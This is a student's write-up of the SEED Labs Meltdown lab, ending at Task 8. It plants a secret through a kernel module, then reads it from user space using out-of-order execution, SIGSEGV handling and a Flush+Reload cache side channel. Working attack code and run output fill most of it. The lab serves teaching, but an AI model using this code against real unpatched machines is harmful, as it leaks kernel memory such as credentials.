https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/

Based on the task file, we could start the lab.

## Check the cache in the CPU

 

CacheTime.c





## Get the secret

FlushReload.c



## Insert module

make

MwltdownKernel.ko

sudo insmod



## Get the address of the secret

dmesg | grep 'secret data address'



## Test secret address

MeltdownExperiment





## 4. Task 3-5: Preparation for th Meltdown Attack

The isolation between user space and kernel space is based on a supervisor bit of the processor that defines whether a memory page of the kernel can be accessed or not. However, this isolation feature is broken by the Meltdown attack, which allow unpririleged user-level programs to read arbitrary kernel memory.

### 4.1. Task3: Place Secret Data in Kernel Space

Use a kernel module to store the secret data, and use a user-level program ro find out what the secret data is.

Two assumptions:

- We need to know the address of the target secret data. The kernel module saves the address into the kernel message buffer:`printk("secret data address:%p\n", &secret)`.
- The secret data need to be cached, or the arrack's success rate will be low. We can to use the secret one by creating a data entry `/proc/secret_data` to provide a window for user-level programs to interact with the kernel module. When a user-level program reads from this entry, the `read_proc()` function in the kernel module will be invoked, then the secrete variable will be loaded and thus be cached by the CPU.

Compile and insert the module:

```shell
$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep ’secret data address’
[106656.713553] secret data address:fb7c2000
```

### 4.2. Access Kernel Memory from User Space

Try to read the address we get from last task.

```c
$ seed@VM:~/.../Meltdown_Attack$ cat test.c 
#include <stdio.h>

int main(int argc, char const *argv[])
{
	char*kernel_data_addr = (char*)0xfb7c2000;
	char kernel_data =*kernel_data_addr;
	printf("I have reached here.\n");

	return 0;
}
$ seed@VM:~/.../Meltdown_Attack$ ./test 
Segmentation fault
```

User-level can not access the address in the kernel-space, will cause crash.

### 4.3. Task5: Handle Error/Exceptions in C

Accessing prohibited memory location will raise a SIGSEGV signal; ifa program does not handle this exception by itself, the operating system will handle it and terminate theprogram.  

Several ways can be used to prevent programs from crashing by a catastrophic event. One way is to define our own signal handler in the program to capture the exceptions raised by catastrophic events.

Although C does not provide direct support for error handling (or exception handling), such as try/catch clause. However, we can emulate the try/catch clause using `sigsetjmp()` and `siglongjmp()`.

```c
$ cat ExceptionHandling.c
static sigjmp_buf jbuf;
static void catch_segv(){
  // Roll back to the checkpoint set by sigsetjmp().
  siglongjmp(jbuf, 1);
}

int main(){
  // The address of our secret data
  unsigned long kernel_data_addr = 0xfb61b000;
  // Set up a signal handler: Register a signal handler. When a SIGSEGV signal is raised, the handler function catch_segv() will be invoked.
  signal(SIGSEGV, catch_segv);
  // Set up a checkpoint: after signal handler has finished processing the exception, it needs to let the program continue its execution from particular checkpoint. sigsetjmp(jbuf, 1) saves the stack context/environment in jbuf for later use by siglongjmp(); it returns o when the checkpoint is set up.
  // Roll back to a checkpoint: Whn siglongjmp(jbuf, 1) is called, the state saved in the jbuf variable is copied back in the processor and computation starts over from the return point of the sigsetjmp() function, but the returned value of the sigsetjmp() function is the second argument of the siglongjmp() function, which is 1 in our case. Therefore, after the exception handling, the program continues its execution from the else branch.
  if (sigsetjmp(jbuf, 1) == 0) {
    // Triggering the exception: A SIGSEGV signal will be raised due to the memory access violation.
    char kernel_data =*(char*)kernel_data_addr;
    // The following statement will not be executed.
    printf("Kernel data at address %lu is: %c\n",kernel_data_addr, kernel_data);
  }else {
    printf("Memory access violation!\n");
  }
  printf("Program continues to execute.\n");
  return 0;
}

[06/25/20]seed@VM:~/.../Meltdown_Attack$ ./ExceptionHandling 
Memory access violation!
Program continues to execute.
```

## 5. Task 6: Out-of-Order Execution by CPU

```c
1 	number = 0;
2		*kernel_address = (char*)0xfb7c2000;
3  	kernel_data =*kernel_address;
4  	number = number + kernel_data;
```

Looking from the outside we know that line 4 will never be executed, but CPU will run ahead once the required resources are available. 

Test code: `MeltdownExperiment.c`

```c
$ cat MeltdownExperiment.c
void meltdown(unsigned long kernel_data_addr){
  char kernel_data = 0;
  // The following statement will cause an exception
  kernel_data =*(char*)kernel_data_addr;
  // Because previous line will cause an exception, this line will no be excuted. And the result will eventually be discarded. However, because of the execution, array[7*4096 + DELTA] will now be cached by CPU. With side channel attack, we will be able to access it.
  array[7*4096 + DELTA] += 1;
}
// Signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main(){
  // Register a signal handler
  signal(SIGSEGV, catch_segv);
  // FLUSH the probing array
  flushSideChannel();
  if (sigsetjmp(jbuf, 1) == 0) {
    // Replace by own address
    meltdown(0xfb61b000);
  }else {
    printf("Memory access violation!\n");
  }
  // RELOAD the probing array
  reloadSideChannel();
  return 0;
}

$ seed@VM:~/.../Meltdown_Attack$ ./MeltdownExperiment 
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
```

## 6. Task7: The Basic Meltdown Attack

 How far a CPU can go inthe out-of-order execution depends on how slow the access check, which is done in parallel, is performed. This is a typical race condition situation.  In this task, we will exploit this race condition to steal a secretfrom the kernel.

### 6.1. Task7.1: A Naive Approach

Based on the description, I tried to change the 7 to the kernal_data in the `Meltdown` function.

```shell
$ cat MeltdownExperiment.c
...
void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;
  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;     
  array[kernel_data * 4096 + DELTA] += 1;          
}
...
seed@VM:~/.../Meltdown_Attack$ ./MeltdownExperiment 
Memory access violation!
array[0*4096 + 1024] is in cache.
The Secret = 0.
seed@VM:~/.../Meltdown_Attack$ ./MeltdownExperiment 
Memory access violation!
...
```

Sometimes will show the value.

### 6.2. Task 7.2: Improve tha Attack by Getting the Secret Data Cached

Meltdown is a race condition vulnerability, which involves the racing between the out-of-order executionand the access check.  The faster the out-of-order execution is, the more instructions we can execute, and themore likely we can create an observable effect that can help us get the secret. 

- Load the kernel data into a register. At the same time, the security check on such an access is performed.  If the data loading is slower thansecurity check, i.e., when the security check is done, the kernel data is still on its way from the memory tothe register, the out-of-order execution will be immediately interrupted and discarded, because the accesscheck fails. Our attack will fail as well.
- If the kernel data is already in the CPU cache, loading the kernel data into a register will be much faster. 

This lab will get the kernel secret data cached before launching the attack. We let user-level program to invoke a function inside the kernel module. 

```c
  // Open the /proc/secret_data virtual file.
  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
```

### 6.3. Task7.3: Using Assembly Code to Trigger Meltdown

```c
void meltdown_asm(unsigned long kernel_data_addr){
  char kernel_data = 0;
  // Give eax register something to do	
  asm volatile(".rept 400;"									// loop 400 times
               "add $0x141, %%eax;"					// It only do unless computations, but according to a post discussion, these extra lines of code "give the algorithmic units something to chew while memory access is being speculated"
               ".endr;"
               :
               :
               : "eax"
              );
  // The following statement will cause an exception
  kernel_data =*(char*)kernel_data_addr;
  array[kernel_data*4096 + DELTA] += 1;
}
```

## 7. Task 8: Make the Attack More Practical

Create a score array of size 256, one element for each possible secret value.

